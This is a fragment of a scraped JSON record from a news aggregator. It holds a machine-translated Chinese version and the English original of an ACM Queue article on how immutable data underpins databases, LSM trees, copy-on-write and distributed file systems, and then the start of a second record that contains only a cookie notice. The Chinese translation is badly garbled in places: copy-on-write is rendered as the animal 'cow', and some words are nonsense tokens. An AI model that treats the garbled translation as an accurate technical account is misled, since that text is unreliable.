\u6bcf\u4e2a\u7248\u672c\u90fd\u662f\u4e0d\u53ef\u53d8\u7684\u3002\u672c\u8282\u9996\u5148\u5728\u591a\u8fb9\u5f62\u5e76\u53d1\u63a7\u5236\u4e2d\u67e5\u770b;\u7136\u540e\uff0c\u5982LSM\u5728\u4e8b\u52a1\u7a7a\u95f4\u5185\u63d0\u4f9b\u8bed\u4e49\u7684\u6280\u672f\uff0c\u540c\u65f6\u751f\u6210\u63cf\u8ff0\u8fd9\u4e9b\u53d8\u5316\u72b6\u6001\u7684\u4e0d\u53ef\u53d8\u6570\u636e;\u6700\u540e\uff0c\u5b83\u901a\u8fc7\u6bcd\u725b\u7684\u955c\u5934\u770b\u4e16\u754c\uff0c\u5176\u4e2d\u901a\u8fc7\u7f16\u5199\u65b0\u7684\u4e0d\u53ef\u53d8\u6570\u636e\u6765\u5b9e\u73b0\u9ad8\u6027\u80fd\u66f4\u65b0\u3002\n   \u7248\u672c\u5e94\u8be5\u6709\u4e0d\u53ef\u53d8\u7684\u540d\u79f0\u3002\u9664\u4e86\u7b2c\u4e00\u4e2a\u7248\u672c\u7684\u4e1c\u897f\u4e4b\u5916\uff0c\u4e00\u4e2a\u65b0\u7248\u672c\u6355\u83b7\u4e86\u66f4\u66ff\u6362\u7684\u6216\u589e\u5f3a\u65e9\u671f\u7248\u672c\u7684\u66ff\u4ee3\u3002\u7ebf\u6027\u7248\u672c\u5386\u53f2\u6709\u65f6\u88ab\u79f0\u4e3a\u5f3a\u70c8\u4e00\u81f4\uff1a\u4e00\u4e2a\u7248\u672c\u66ff\u6362\u53e6\u4e00\u4e2a\u7248\u672c;\u6709\u4e00\u4e2a\u7236\u6bcd\u548c\u4e00\u4e2a\u5b69\u5b50\u5728\u90a3\u91cc\u3002\u6bcf\u4e2a\u7248\u672c\u90fd\u662f\u4e0d\u53ef\u53d8\u7684;\u6bcf\u4e2a\u7248\u672c\u90fd\u6709\u4e00\u4e2a\u8eab\u4efd\u3002\u7ebf\u6027\u7248\u672c\u5386\u53f2\u7684\u66ff\u4ee3\u65b9\u6848\u662f\u7248\u672c\u5386\u53f2\u7684DAG\uff08\u5b9a\u5411\u975e\u5faa\u73af\u56fe\uff09\uff0c\u5176\u4e2d\u6709\u8bb8\u591a\u7236\u6bcd\u548c/\u6216\u8bb8\u591a\u5b69\u5b50\u3002\u8fd9\u6709\u65f6\u88ab\u79f0\u4e3a\u6700\u7ec8\u7684\u4e00\u81f4\u6027\u3002\n   \u5f3a\u70c8\u4e00\u81f4\uff0c\u6216\u9178\uff08\u539f\u5b50\u5b66\uff0c\u4e00\u81f4\u6027\uff0c\u9694\u79bb\uff0c\u8010\u7528\u6027\uff09\uff0c\u4e8b\u52a1\u663e\u793a\u597d\u50cf\u5b83\u4eec\u4ee5\u4e32\u884c\u987a\u5e8f\u8fd0\u884c\u3002\u8fd9\u6709\u65f6\u88ab\u79f0\u4e3a\u5e8f\u5217\u5316\u3002 2\n \u6570\u636e\u5e93\u6309\u7248\u672c\u66f4\u6539\u7248\u672c\u3002\u4e8b\u52a1T1\u662f\u4e00\u4e2a\u7248\u672c\uff0c\u7a0d\u540e\u7684\u4e8b\u52a1T2\u662f\u4e00\u4e2a\u7248\u672c\u3002 TAXTALLELED\u7684\u8bb0\u5f55\u548c\u7d22\u5f15\u7684\u65b0\u7248\u672c\u548c\u7d22\u5f15\u5728\u65e9\u671f\u7248\u672c\u4e0a\u66f4\u6539\u3002\u65b0\u7248\u672c\u53ef\u4ee5\u6355\u83b7\u4e3a\u6574\u4e2a\u6570\u636e\u5e93\u7684\u5feb\u7167\uff08\u867d\u7136\u8fd9\u4e0d\u4f1a\u5bfc\u81f4\u9ad8\u6027\u80fd\uff09\u3002\n \u6216\u8005\uff0c\u53ef\u4ee5\u5c06\u65b0\u7248\u672c\u6355\u83b7\u4e3a\u5bf9\u4ee5\u524d\u7248\u672c\u7684\u66f4\u6539\u3002\u4ee5\u8fd9\u79cd\u65b9\u5f0f\uff0c\u53ef\u4ee5\u6784\u5efa\u5bc6\u94a5\u503c\u5b58\u50a8\uff0c\u5e76\u4e14\u53ef\u4ee5\u5728\u952e\u503c\u5b58\u50a8\u5668\u4e0a\u6784\u5efa\u5173\u7cfb\u6570\u636e\u5e93\u3002\u901a\u8fc7\u6dfb\u52a0Tombstones\u5220\u9664\u8bb0\u5f55\u3002\u66f4\u6539\u6570\u636e\u5e93\u662f\u901a\u8fc7\u5411\u952e\u503c\u5b58\u50a8\u6dfb\u52a0\u65b0\u8bb0\u5f55\u6765\u5b8c\u6210\u7684\u3002 \n\u5982\u679c\u5c06\u65f6\u95f4\u6233\u6dfb\u52a0\u5230\u6bcf\u4e2a\u65b0\u7248\u672c\u4e2d\uff0c\u5219\u53ef\u4ee5\u5728\u7ed9\u5b9a\u7684\u65f6\u95f4\u70b9\u663e\u793a\u6570\u636e\u5e93\u7684\u72b6\u6001\u3002\u8fd9\u5141\u8bb8\u7528\u6237\u5c06\u6570\u636e\u5e93\u7684\u72b6\u6001\u5bfc\u822a\u5230\u4efb\u4f55\u65e7\u7248\u672c\u3002\u6b63\u5728\u8fdb\u884c\u7684\u5de5\u4f5c\u53ef\u4ee5\u770b\u5230\u6570\u636e\u5e93\u7248\u672c\u7684\u7a33\u5b9a\u5feb\u7167\u3002\n   LSM\u5728\u4e0d\u53ef\u53d8\u6863\u6848\u4e0a\u5448\u73b0\u4e86\u4e00\u4e2a\u5916\u89c2\u7684\u53d8\u5316\u3002\u4f7f\u7528LSM\u6811\uff0c\u901a\u8fc7\u7f16\u5199\u65b0\u7248\u672c\u7684\u53d7\u5f71\u54cd\u8bb0\u5f55\u6765\u5b8c\u6210\u5bf9\u952e\u503c\u5b58\u50a8\u768415\u4e2a\u66f4\u6539\u3002\u8fd9\u4e9b\u65b0\u7248\u672c\u8bb0\u5f55\u5230\u4e0d\u53ef\u53d8\u7684\u6587\u4ef6\u3002\u5b9a\u671f\uff0c\u6309\u952e\u7684\u65b0\u7248\u672c\u6309\u952e\u6392\u5e8f\uff0c\u5e76\u5c06\u5176\u5199\u5165\u79f0\u4e3aLSM\u6811\u4e2d\u76840\u4e2a\u6587\u4ef6\u7684\u4e0d\u53ef\u53d8\u6587\u4ef6\u3002\u7ea7\u522b0\u6587\u4ef6\u5408\u5e76\u4e3a\u7ea7\u522b1\u7ea7\u522b\u7684\u96c6\u5408\uff08\u901a\u5e38\u4e3a10\u7ea7\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5305\u542b\u7b2c\u5341\u4e2a\u5173\u952e\u8303\u56f4\uff09\u3002\u540c\u6837\uff0c\u7ea7\u522b1\u4e2a\u6587\u4ef6\u4e0e10\u52301\u4e2a\u6587\u4ef6\u5408\u5e76\u4e3a2\u7ea7\u6587\u4ef6\u3002\u968f\u7740LSM\u6811\u79fb\u52a8\uff0c\u6bcf\u4e2a\u7ea7\u522b\u90fd\u670910\u500d\u7684\u6587\u4ef6\u3002\u8bfb\u53d6\u8bb0\u5f55\u901a\u5e38\u6d89\u53ca\u641c\u7d22\u6bcf\u4e2a\u7ea7\u522b\u7684\u6587\u4ef6\u3002\u968f\u7740LSM\u6587\u4ef6\u5408\u5e76\uff0c\u53ef\u4ee5\u5199\u5165\u5177\u6709\u65b0\u6807\u8bc6\u7684\u65b0\u7684\u4e0d\u53ef\u53d8\u6587\u4ef6\u3002\n   LSM\u6811\u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u725b\u6765\u521b\u5efa\u4e0d\u53ef\u53d8\u5f62\u7684\u6587\u4ef6\u3002\u526f\u672c\u7684\u7c92\u5ea6\u901a\u5e38\u662f\u952e\u503c\u5bf9\u3002\u5bf9\u4e8e\u5173\u7cfb\u6570\u636e\u5e93\uff0c\u8fd9\u53ef\u4ee5\u662f\u6bcf\u4e2a\u8bb0\u5f55\u6216\u6bcf\u4e2a\u7d22\u5f15\u6761\u76ee\u7684\u952e\u503c\u5bf9\u3002\u5c06\u66f4\u6539\u590d\u5236\u5230\u65e5\u5fd7\u4e2d\uff0c\u7136\u540e\u590d\u5236\u5230LSM\u6811\uff08\u5e76\u4e3a\u5408\u5e76\u590d\u5236\u51e0\u6b21\uff09\u3002\n \u9ad8\u6027\u80fd\u725b\u4e0e\u65e5\u5fd7\u548c\u7ecf\u5178\u7684DBMS\u6027\u80fd\u6280\u672f\u53d1\u751f\u3002\u65b0\u7248\u672c\u5728\u5185\u5b58\u4e2d\u6355\u83b7\u5e76\u8bb0\u5f55\u4ee5\u8fdb\u884c\u6545\u969c\u6062\u590d\u3002\u6bcf\u4e2a\u65e5\u5fd7\u6587\u4ef6\u7684\u6807\u8bc6\u662f\u552f\u4e00ID\uff0c\u65e5\u5fd7\u6587\u4ef6\u662f\u4e0d\u53ef\u53d8\u7684\u3002\u6bcf\u4e2a\u65b0\u65e5\u5fd7\u6587\u4ef6\u90fd\u53ef\u4ee5\u8bb0\u5f55\u5176\u524d\u9762\u7684\u65e5\u5fd7\u6587\u4ef6\u7684\u5386\u53f2\u8bb0\u5f55\uff0c\u751a\u81f3\u662f\u5373\u5c06\u5230\u6765\u7684\u65e5\u5fd7\u6587\u4ef6\u7684\u6807\u8bc6\u3002\u6709\u4e00\u4e2a\u6700\u8fd1\u7684\u65e5\u5fd7\u6587\u4ef6ID\u8868\u793a\u53ef\u4ee5\u91cd\u5efa\u6574\u4e2aLSM\u952e\u503c\u5b58\u50a8\u3002\n   \u8bb8\u591a\u6587\u4ef6\u7cfb\u7edf\u90fd\u4f1a\u4fdd\u7559\u7531\u4e0d\u53ef\u53d8\u5757\u7ec4\u6210\u7684\u4e0d\u53ef\u53d8\u6587\u4ef6\u3002\u672c\u8282\u63a2\u8ba8\u4e86\u9ad8\u6c34\u5e73\u7684GFS\u548cHDF\u7684\u5b9e\u73b0\u4ee5\u53ca\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u6587\u4ef6\u5b8c\u6210\u7684\u5185\u5bb9\u7684\u5f71\u54cd\u3002\u5b83\u8ba8\u8bba\u4e86\u53ef\u4ee5\u91cd\u547d\u540d\u7684\u6587\u4ef6\u7684\u53d8\u5e7b\u83ab\u6d4b\uff0c\u5e76\u8003\u8651\u5728\u4e00\u81f4\u7684\u54c8\u5e0c\u5546\u5e97\u4e2d\u5b58\u50a8\u4e0d\u53ef\u53d8\u6570\u636e\u7684\u503c\u3002\n   \u901a\u8fc7\u4e0d\u53d8\u6027\u6539\u53d8\u66f4\u6539\u7684\u65e9\u671f\u793a\u4f8b\u662f\u5bf9\u6570\u7ed3\u6784\u7684\u6587\u4ef6\u7cfb\u7edf\u3002 16\u5728\u8fd9\u672c\u7cbe\u5f69\u7684\u53d1\u660e\u4e2d\uff0c\u6587\u4ef6\u7cfb\u7edf\u5199\u5165\u603b\u662f\u9644\u52a0\u5230\u5faa\u73af\u7f13\u51b2\u533a\u7684\u672b\u5c3e\u3002\u5076\u5c14\uff0c\u8981\u91cd\u5efa\u6587\u4ef6\u7cfb\u7edf\u7684\u8db3\u591f\u91cd\u5efa\u7684\u5143\u6570\u636e\u88ab\u6dfb\u52a0\u5230\u5faa\u73af\u7f13\u51b2\u533a\u3002\u5fc5\u987b\u5411\u524d\u590d\u5236\u65e7\u6570\u636e\uff0c\u4ee5\u4fbf\u672a\u88ab\u8986\u76d6\u3002\n \u65e5\u5fd7\u7ed3\u6784\u7684\u6587\u4ef6\u7cfb\u7edf\u5177\u6709\u4e00\u4e9b\u6709\u8da3\u7684\u6027\u80fd\u7279\u5f81\uff0c\u65e2\u597d\u53c8\u574f\u3002\u4eca\u5929\u4ed6\u4eec\u662f\u4e00\u4e2a\u91cd\u8981\u7684\u6280\u672f\u3002\u968f\u7740\u6280\u672f\u8d8b\u52bf\u5728\u8fd1\u5e74\u6765\u7684\u65b9\u5411\u4e0a\u7ee7\u7eed\u79fb\u52a8\uff0c\u5b83\u4eec\u5c06\u53d8\u5f97\u66f4\u52a0\u91cd\u8981\u3002 \nGFS\uff0c5\u4e2aHDFS\uff0c1\u548c\u5176\u4ed6\u63d0\u4f9b\u9ad8\u5ea6\u53ef\u7528\u7684\u6587\u4ef6\u3002\u6bcf\u4e2a\u6587\u4ef6\u90fd\u662f\u4e00\u5806\u5757\uff08\u4e5f\u79f0\u4e3a\u5757\uff09\u3002\u8be5\u6587\u4ef6\u7531\u6587\u4ef6\u540d\u548c\u63d0\u4f9b\u4ea4\u53c9\u6d41\u6240\u9700\u7684\u5757\u7684\u63cf\u8ff0\u7ec4\u6210\u3002\u6bcf\u4e2a\u5757\u90fd\u5728\u7fa4\u96c6\u4e2d\u590d\u5236\u4ee5\u8fdb\u884c\u8010\u7528\u6027\u548c\u9ad8\u53ef\u7528\u6027\u3002\u901a\u5e38\u5728\u6570\u636e\u4e2d\u5fc3\u7684\u4e0d\u540c\u6545\u969c\u533a\u57df\u4e0a\u590d\u5236\u4e09\u6b21\u3002\n \u6bcf\u4e2a\u6587\u4ef6\u90fd\u662f\u4e0d\u53ef\u53d8\u7684\uff0c\uff08\u901a\u5e38\uff09\u5355\u4e2a\u7f16\u5199\u5668\u3002\u521b\u5efa\u8be5\u6587\u4ef6\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u9644\u52a0\u5230\u5b83\u3002\u6587\u4ef6\u751f\u5b58\u4e86\u4e00\u6bb5\u65f6\u95f4\uff0c\u5e76\u6700\u7ec8\u5220\u9664\u3002\u591a\u7248\u672c\u5f88\u96be\uff0cGFS\u5bf9\u6b64\u6709\u4e00\u4e9b\u6311\u6218\u3002 13.\n \u4e0d\u53d8\u7684\u6587\u4ef6\u548c\u4e0d\u53ef\u53d8\u5757\u6388\u6743\u6b64\u590d\u5236\u3002\u6587\u4ef6\u7cfb\u7edf\u5bf9\u5b8c\u6574\u6587\u4ef6\u6ca1\u6709\u66f4\u6539\u7684\u6982\u5ff5\u3002\u6bcf\u4e2a\u5757\uff06\uff0339; s\u7684\u4e0d\u53ef\u52a8\u63d0\u5668\u5141\u8bb8\u5b83\u5728\u6ca1\u6709\u4efb\u4f55\u66f4\u65b0\u5f02\u5e38\u7684\u60c5\u51b5\u4e0b\u8f7b\u677e\u590d\u5236\uff0c\u56e0\u4e3a\u5b83\u6ca1\u6709\u66f4\u65b0\u3002\n   \u4e00\u4e2a\u4e0d\u53ef\u53d8\u7684\u6587\u4ef6\u5177\u6709\u8eab\u4efd\u548c\u5185\u5bb9\uff0c\u4e5f\u4e0d\u80fd\u6539\u53d8\u3002\u60a8\u53ef\u4ee5\u968f\u65f6\u968f\u5730\u590d\u5236\u4e0d\u53ef\u53d8\u6587\u4ef6\u5e76\u5728\u4efb\u4f55\u7528\u6237\u8eab\u8fb9\u5206\u4eab\u7528\u6237\u7684\u4e0d\u53ef\u53d8\u526f\u672c\u3002\u53ea\u8981\u60a8\u7ba1\u7406\u53c2\u8003\u8ba1\u6570\uff08\u6240\u4ee5\u60a8\u77e5\u9053\u5b83\u4f55\u65f6\u4f55\u65f6\u5220\u9664\u5b83\uff09\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u6587\u4ef6\u7684\u4e00\u4e2a\u526f\u672c\u6765\u5206\u4eab\u8bb8\u591a\u7528\u6237\u3002\u60a8\u53ef\u4ee5\u968f\u65f6\u968f\u5730\u5206\u53d1\u4e0d\u53ef\u53d8\u7684\u6587\u4ef6\u3002\u4f7f\u7528\u76f8\u540c\u7684\u8eab\u4efd\u548c\u76f8\u540c\u7684\u5185\u5bb9\uff0c\u6587\u4ef6\u662f\u72ec\u7acb\u7684\u3002\n   GFS\u548cHDFS\u90fd\u63d0\u4f9b\u4e0d\u53d8\u7684\u6587\u4ef6\u3002\u4e0d\u53ef\u53d8\u5757\uff08\u5757\uff09a\n...... ", "note_en": "January 20, 2016   Volume 13, issue 9       There is an inexorable trend toward storing and sending immutable data. We  need immutability to coordinate at a distance, and we  can afford immutability as storage gets cheaper. This article is an  amuse-bouche sampling the repeated patterns of computing that leverage immutability. Climbing up and down the compute stack really does yield a sense of d\u00e9j\u00e0 vu all over again.\n It wasn&#39;t that long ago that computation was expensive, disk storage was expensive, DRAM (dynamic random access memory) was expensive, but coordination with latches was cheap. Now all these have changed using cheap computation (with many-core), cheap commodity disks, and cheap DRAM and SSDs (solid-state drives), while coordination with latches has become harder because latch latency loses lots of instruction opportunities. Keeping immutable copies of lots of data is now affordable, and one payoff is reduced coordination challenges.\n   Storage is increasing as the cost per terabyte of disk keeps dropping. This means a lot of data can be kept for a long time. Distribution is increasing as more and more data and work are spread across a great distance. Data within a data center seems &#34;far away.&#34; Data within a many-core chip may seem &#34;far away.&#34; Ambiguity is increasing when trying to coordinate with systems that are far away\u2014more stuff has happened since you&#39;ve heard the news. Can you take action with incomplete knowledge? Can you wait for enough knowledge?\n   As various technological areas have evolved, they have responded to these trends of increasing storage, distribution, and ambiguity by using immutable data in some very fun ways. This article explores how apps use immutability in their ongoing work, how they generate immutable data sets for later offline analysis, how SQL can expose and process immutable snapshots, and how massively parallel big-data work relies on immutable data sets. This leads to looking at the ways in which semantically immutable data sets may be altered while remaining immutable.\n Next, the article considers how updatability is layered atop the creation of new immutable files via techniques such as LSF (log-structured file system), COW (copy-on-write), and LSM (log-structured merge-tree). How do replicated and distributed file systems depend on immutability to eliminate anomalies? Hardware folks have joined the party by leveraging these tricks in SSDs and HDDs (hard-disk drives). Immutability is a key architectural concept at many layers of the stack, as shown in figure 1.\n     Many kinds of computing are append-only. This section looks at some of the ways this is commonly accomplished.\n   In append-only computing, observations are recorded forever (or for a long time). Derived results are calculated on demand (or periodically precalculated).\n This is similar to a DBMS (database management system) in which transaction logs record all the changes made to the database. High-speed appends are the only way to change the log. From this perspective, the contents of the database hold a caching of the latest record values in the logs. The truth is the log. The database is a cache of a subset of the log. That cached subset happens to be the latest value of each record and index value from the log.\n   Accountants don&#39;t use erasers; otherwise they may go to jail. All entries in a ledger remain in the ledger. Corrections can be made but only by making new entries in the ledger. When a company&#39;s quarterly results are published, they include small corrections to the previous quarter. Small fixes are OK. They are append-only, too.\n Some entries describe  observed facts. For example, receiving a debit or credit against a checking account is an observed fact. Some entries describe  derived facts, meaning that, based on the observations, something new can be calculated. For example, amortized capital expenses based upon a rate and a cost are derived facts. Another example is the current bank account balance with applied debits and credits.\n   Single-master computing means changes are ordered somehow. The order can come from a centralized master or some Paxos-like 11 distributed protocol providing serial ordering. Changes are semantically applied one at a time and are layered over their predecessors. New values supersede old ones. The granularity of this may be a set of records in a relational store or a new version of a document. Distributed single-master computing means there is a space of data (relational records, documents, export files, and more) that emanates from one logical location with new versions over time.\n   Before telephones, people used messengers\u2014often kids walking through town to deliver the message. Alternatively, the postal service delivered the messages, which took a long time. Sometimes people used fancy forms with many layers, each a different color. They had multiple sections on the page. Each participant filled out a section (pressing hard with the pen), then tore off the back page of the form and filed it. Each participant got the data needed and added more data to the form. Earlier sections could not be updated; data could only be appended to the end.\n Before computers, workflow was frequently captured in paper forms with multiple parts on the form and multiple pages (e.g., &#34;Fill out Part 3 and keep the goldenrod page from the back&#34;). This &#34;distributed computing&#34; was append-only. New messages were new additions to the form\u2014each was a version and each was immutable. You were never allowed to overwrite what had been written.\n   Surprisingly (to database old-timers), not all data is kept in relational database systems. This section (based on an earlier paper 7) discusses some of the implications of unlocking data.\n   Data on the inside refers to what is kept and managed by a classic relational database system and its surrounding application code. Sometimes this is referred to as a  service.\n Data on the inside lives in a transactional world with changes applied in a serializable fashion (or something close to that).\n   Data on the outside is prepared as messages, files, documents, and/or Web pages. These are sent out from a service into the world. It is also possible that outside data has been created by some other mechanism than one using databases.\n   * Is unlocked. It is not locked in the database. A copy is extracted and sent outside.\n * Has identity. When sent outside, these files, documents, and messages have a unique identity (perhaps a URL).\n * May be versioned. Updates aren&#39;t updates but new versions with a new unique identifier.\n   There are deep differences in the representation, meaning, and usage of inside data versus outside data. Increasingly, data is being kept as outside (immutable) data (see figure 2).\n    The data set is a collection of data with a unique ID. Some data sets have structures that look like a number of tables with schema. How are these data sets referenced by a relational database, and how do relational operators span both the DBMS and data set?\n   A data set is a fixed and immutable set of tables. The schema for each table is captured in the data set. The contents of each table are captured when the data set is created. Since the data set is immutable, it is created, may be consumed for reading, and then deleted. Data sets may be relational, or they may have some other representation such as a graph, a hierarchy such as JSON (JavaScript Object Notation), or any other representation (figure 3). A data set is a logical set of immutable tables along with its schema.\n    Data sets may be referenced by an RDBMS (relational DBMS). The metadata is visible to the DBMS. The data can be accessed for a read, even though it may not be updated. The data set may be semantically present within the relational system even if it is physically stored elsewhere. Because the data set is immutable, there&#39;s no need for locking and no worries about controlling updates.\n   A functional calculation takes a set of inputs and predictably creates a set of outputs. This can happen with a query against locked or snapshot data in a relational database, and it can happen on a big-data MapReduce-style system. In both cases, there is still an unchanging collection of data. With snapshots or some form of isolation, database data becomes semantically immutable for the duration of the calculation. With big-data calculations, the inputs are typically stored in GFS (Google File System) or HDFS (Hadoop Distributed File System) files.\n There&#39;s no semantic obstacle to doing JOINs across data stored inside a relational database and data stored in external data sets. Locking (or snapshot isolation) provides a version of the relational database, which may be joined. Named and frozen data sets may be joined with relational data (see figure 4). You can meaningfully apply relational operations across data held in a DBMS and data held in immutable data sets.\n  In some ways, the ability to work across immutable data sets and relational databases is surprising. An immutable data set is defined with an identity and an optional version. Its schema, which describes the shape and form of the data set at the time of its creation, is descriptive, whereas the schema held in the RDBMS is prescriptive.\n This tailoring of the schema to meld the two connects the schema of the data set (describing its data when written) with the schema of the RDBMS (describing its data as of the snapshot). Also, the JOINs and other relational operators must necessarily combine the contents of the data set as interpreted as a set of relational tables. This sidesteps the notion of identity within the data set and focuses exclusively on the tables as interpreted as a set of values held within rows and columns.\n   A consumer may see data sets as immutable even if they change under the covers.\n   A data set is semantically immutable. It has a set of tables, rows, and columns. It may also have semi-structured data (e.g., JSON). It may have application-specific data in a proprietary format.\n Data sets may be defined as a SELECTION, PROJECTION, or JOIN over previously existing data sets. Semantically, all that data is now a part of the new data set.\n What&#39;s important about a data set is that it appears to be unchanging from the standpoint of the reader.\n   Data sets are semantically immutable but can be physically changed. You can add an index or two. It&#39;s OK to denormalize tables to optimize for read access. Data sets can be partitioned and the pieces placed close to their readers. A column-oriented representation of a data set may also make sense.\n You can make a copy of a table with far fewer columns to optimize for quick access (a skinny table). The column values can be left in both the skinny table and fat table.\n By watching and monitoring the read usage of a data set, you may realize that new optimizations (e.g., new indices) are possible.\n   Immutability is the backbone of big data. Massively parallel computations are based on immutable inputs and functional calculations. MapReduce 3 and Dryad 9 both take immutable files as input. The work is cut into pieces, each with immutable input. This functional calculation (using immutable inputs) is idempotent, making it possible to fail and restart. Immutability is the backbone of big data. MapReduce performs functional computations over immutable data to create immutable outputs. Failure and restart, so essential to reliable big data, are based on the idempotent nature of functional computation over immutable inputs.\n   Data sets show an immutable semantic prism, even if the underlying representation is augmented or completely replaced. The King James Bible is, character for character, immutable\u2014even when it is printed in a different font; even when digitized; even when accompanied by different pictures.\n Is a data set changed if there is a lossless transformation to a new schema representation? Can the new address field have more capacity? Can the enum values be mapped to a new underlying representation? Can the data be mapped from UTF-8 to UTF-16 encoding?\n Having the right bits is not enough. You have to know how to interpret them. For example, &#34;President Bush&#34; had a different meaning in 1990 than in 2005. The word &#34;napkin&#34; is interpreted differently in the US and the UK.\n   When an immutable data set is created, the semantics of the data may not be changed. The contents may only be described as they are at the time the data set is created.\n Most programmers are used to SQL DDL (Data Definition Language) supporting dynamic changes in the metadata for their tables. This happens at a transaction boundary and can prescribe a new schema for the existing data. SQL DDL can be thought of as  prescriptive metadata since it is prescribing the representation (which may change). Immutable data sets have  descriptive metadata that explains what&#39;s there.\n Of course, it is possible to create new data sets that refer to one or more existing data sets in order to create a new representation of their data. Each new data set has a unique ID. There&#39;s nothing wrong with having a data set implemented by reference and not by value.\n   The goal of normalization is to eliminate update anomalies. When the data is not stored in a normalized fashion, updates might yield unpleasant results. The classic example is an imperfectly normalized table in which each employee has his or her manager&#39;s name and phone number. This makes it very hard to update the manager&#39;s phone number since it is stored in many places. Normalization is very important in a database designed for updating.\n Normalization is not necessary in an immutable data set, however. The only reason to normalize immutable data sets may be to reduce the storage necessary for them. On the other hand, denormalized data sets may be easier and faster to process as inputs to a computation.\n   Each version is immutable. This section looks first at multiversion concurrency control; then techniques such as LSM that provide a semantic of change within a transactional space while generating immutable data that describes the state of these changes; finally, it looks at the world through the lens of COW, in which high-performance updates are implemented by writing new immutable data.\n   Versions should have immutable names. Other than the first version of something, a new version captures a replacement for or an augmentation of an earlier version. A  linear version history is sometimes referred to as being strongly consistent: one version replaces another; there&#39;s one parent and one child; each version is immutable; each version has an identity. The alternative to linear version history is a DAG (directed acyclic graph) of version history, in which there are many parents and/or many children. This is sometimes called eventual consistency.\n   Strongly consistent, or ACID (atomicity, consistency, isolation, durability), transactions appear as if they run in a serial order. This is sometimes called serializability. 2\n The database changes version by version. Transaction T1 is a version and later transaction T2 is a version. Transactions layer new versions of record and index changes atop earlier versions. The new versions can be captured as snapshots of the entire database (although this wouldn&#39;t result in high performance).\n Alternatively, the new version can be captured as changes to the previous version. In this way, a key-value store can be built, and a relational database can be built atop a key-value store. Records are deleted by adding tombstones. Changing the database is done by adding new records to the key-value store.\n If a timestamp is added to each new version, it is possible to show the state of the database at a given point in time. This allows the user to navigate the state of the database to any older version. Ongoing work can see a stable snapshot of a version of the database.\n   LSM presents a fa\u00e7ade of change atop immutable files. With an LSM tree, 15 changes to the key-value store are accomplished by writing new versions of the affected records. These new versions are logged to an immutable file. Periodically, the new versions of the key values are sorted by key and written to an immutable file known as a Level 0 file within the LSM tree. Level 0 files are merged into a collection of Level 1 files (typically 10 Level 1 files, each containing one-tenth of the key range). Similarly, Level 1 files are merged with Level 2 files on a 10-to-1 basis. As you move down the LSM tree, each level has 10 times as many files. Reading a record typically involves searching one file per level. As the LSM files merge, new immutable files with new identities can be written.\n   An LSM tree can create changeable data out of immutable files by performing a COW. The granularity of the copy is typically a key-value pair. For a relational database, this can be a key-value pair for each record or each index entry. The changes are copied into the log and then into the LSM tree (and copied a few more times for merges).\n High-performance COW happens with logging and classic DBMS performance techniques. The new versions are captured in memory and logged for failure recovery. The identity of each log file is a unique ID, and the log files are immutable. Each new log file can record the history of its preceding log files and even the identity of upcoming log files. Having one of the recent log-file IDs means the entire LSM key-value store can be reconstructed.\n   Many file systems keep immutable files consisting of immutable blocks. This section explores at a high level the implementation of GFS and HDFS and the implications of what can be done with these files. It discusses the vagaries of files that can be renamed and considers the value of storing immutable data within a consistent hash store.\n   An early example of reifying change through immutability is the log-structured file system. 16 In this wonderful invention, file-system writes are always appended to the end of a circular buffer. Occasionally, enough metadata to reconstruct the file system is added to the circular buffer. Old data must be copied forward so it is not overwritten.\n Log-structured file systems have some interesting performance characteristics, both good and bad. Today they are an important technique. As technology trends continue to move in the direction of recent years, they will become even more important.\n   GFS, 5 HDFS, 1 and others offer highly available files. Each file is a bunch of blocks (also called  chunks). The file consists of a file name and a description of the blocks needed to provide a bytestream. Each block is replicated in the cluster for durability and high availability. They are typically replicated three times over different fault zones in the data center.\n Each file is immutable and (typically) single-writer. The file is created, and one process can append to it. The file lives for a while and is eventually deleted. Multiwriters are difficult, and GFS had some challenges with this. 13\n Immutable files and immutable blocks empower this replication. The file system has no concept of a change to a complete file. Each block&#39;s immutability allows it to be easily replicated without any update anomalies because it doesn&#39;t get updated.\n   An immutable file has an identity and contents, neither of which can change. You can copy an immutable file whenever and wherever you want and share the immutable copies across users. As long as you manage reference counts (so you know when it&#39;s OK to delete it), you can use one copy of the file to share across many users. You can distribute immutable files wherever you want. With the same identity and same contents, the files are location independent.\n   GFS and HDFS both provide immutable files. Immutable blocks (chunks) a\n......", "posttime": "2021-06-26 17:33:04", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u53d8\u5316,immutability,\u6570\u636e", "title": "\u4e0d\u53ef\u53d8\u5316\u6539\u53d8\u4e86\u4e00\u5207 ", "title_en": "Immutability Changes Everything", "transed": 1, "url": "https://queue.acm.org/detail.cfm?id=2884038", "via": "", "real_tags": ["\u53d8\u5316", "\u6570\u636e"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1068409, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "www.electronicdesign.com\u6b63\u5728\u4f7f\u7528\u5b89\u5168\u670d\u52a1\u6765\u4fdd\u62a4\u5728\u7ebf\u653b\u51fb\u3002 \u8be5\u670d\u52a1\u9700\u8981\u5b8c\u6574\u7684cookie\u652f\u6301\u4ee5\u67e5\u770b\u672c\u7f51\u7ad9\u3002 ", "note_en": "www.electronicdesign.com is using a security service for protection against online attacks. The service requires full cookie support in order to view this website.", "posttime": "2021-06-26 17:32:56", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u786c\u4ef6,\u8f6f\u4ef6,ada,insulate,\u670d\u52a1", "title": "\u5982\u4f55\u4f7f\u7528ADA\u4ece\u786c\u4ef6\u66f4\u65b0\u4e2d\u7edd\u7f18\u8f6f\u4ef6 ", "title_en": "How to Use Ada to Insulate Software from Hardware Updates", "transed": 1, "url": "https://www.electronicdesign.com/technologies/embedded-revolution/article/21167036/adacore-how-to-use-ada-to-insulate-software-from-hardware-updates", "via": "", "real_tags": ["\u786c\u4ef6", "\u8f6f\u4ef6", "ada", "insulate", "\u670d\u52a1"]}, {"category": "", "categoryclass": "", "imagename": "b995e6b8711098d47d50e81ab49789dd.png", "infoid": 1068408, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": 